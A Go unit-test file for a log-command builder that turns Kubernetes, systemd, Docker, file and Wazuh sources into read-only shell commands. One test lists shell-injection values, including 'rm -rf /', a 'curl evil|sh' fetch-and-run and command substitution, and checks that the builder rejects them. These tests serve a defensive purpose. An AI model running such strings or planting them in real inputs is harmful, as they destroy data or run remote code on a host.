// Copyright 2026, Nexus Workbench
// SPDX-License-Identifier: Apache-2.0

package main

import (
	"strings"
	"testing"
)

func TestBuildLogCommandPerSource(t *testing.T) {
	cases := []struct {
		src  LogSource
		want string
	}{
		{LogSource{Kind: "kubernetes", Target: "nexus-api", Namespace: "nexus", Follow: true}, "kubectl logs -f --tail 200 -n nexus nexus-api"},
		{LogSource{Kind: "kubernetes", Target: "pod-1", Container: "sidecar", Lines: 50}, "kubectl logs --tail 50 -c sidecar pod-1"},
		{LogSource{Kind: "systemd", Target: "openclaw-gateway.service", Follow: true}, "journalctl -u openclaw-gateway.service -f -n 200"},
		{LogSource{Kind: "docker", Target: "searxng", Lines: 20}, "docker logs --tail 20 searxng"},
		{LogSource{Kind: "file", Target: "/var/log/syslog", Follow: true}, "tail -F -n 200 /var/log/syslog"},
		{LogSource{Kind: "wazuh", Follow: true}, "tail -F -n 200 /var/ossec/logs/alerts/alerts.json"},
	}
	for _, tc := range cases {
		got, err := BuildLogCommand(tc.src)
		if err != nil {
			t.Fatalf("%+v: %v", tc.src, err)
		}
		if got != tc.want {
			t.Errorf("BuildLogCommand(%+v)\n  got  %q\n  want %q", tc.src, got, tc.want)
		}
	}
}

func TestBuildLogCommandWithGrep(t *testing.T) {
	got, err := BuildLogCommand(LogSource{Kind: "systemd", Target: "sshd", Follow: true, Grep: "Failed password"})
	if err != nil {
		t.Fatal(err)
	}
	if !strings.HasSuffix(got, "| grep --line-buffered -i 'Failed password'") {
		t.Fatalf("grep mal armado: %q", got)
	}
}

// Ningún origen puede mutar estado: el bloque se abre sin confirmación.
func TestLogCommandsAreReadOnly(t *testing.T) {
	for _, kind := range []string{"kubernetes", "systemd", "journal", "docker", "file", "wazuh"} {
		cmd, err := BuildLogCommand(LogSource{Kind: kind, Target: "algo", Follow: true})
		if err != nil {
			t.Fatalf("%s: %v", kind, err)
		}
		if IsDestructive(cmd) {
			t.Fatalf("%s produce un comando destructivo: %s", kind, cmd)
		}
	}
}

// El target puede venir de un agente.
func TestBuildLogCommandRejectsInjection(t *testing.T) {
	injections := []string{"api; rm -rf /", "api && curl evil|sh", "api`id`", "api$(id)", "api > /etc/hosts", "api'", "api\nrm -rf /"}
	for _, target := range injections {
		if _, err := BuildLogCommand(LogSource{Kind: "systemd", Target: target}); err == nil {
			t.Errorf("aceptó inyección en target: %q", target)
		}
		if _, err := BuildLogCommand(LogSource{Kind: "kubernetes", Target: "api", Namespace: target}); err == nil {
			t.Errorf("aceptó inyección en namespace: %q", target)
		}
		if _, err := BuildLogCommand(LogSource{Kind: "systemd", Target: "api", Grep: target}); err == nil {
			t.Errorf("aceptó inyección en grep: %q", target)
		}
	}
}

func TestBuildLogCommandValidatesInput(t *testing.T) {
	if _, err := BuildLogCommand(LogSource{Kind: "systemd"}); err == nil {
		t.Error("un target vacío tiene que ser error")
	}
	if _, err := BuildLogCommand(LogSource{Kind: "inventado", Target: "x"}); err == nil {
		t.Error("un origen desconocido tiene que ser error")
	}
	if _, err := BuildLogCommand(LogSource{Kind: "file", Target: "/x", Lines: 999999}); err == nil {
		t.Error("un lines desmedido tiene que ser error")
	}
	// wazuh es el único que puede omitir el target: tiene ruta por defecto
	if _, err := BuildLogCommand(LogSource{Kind: "wazuh"}); err != nil {
		t.Errorf("wazuh sin target debería usar la ruta por defecto: %v", err)
	}
}
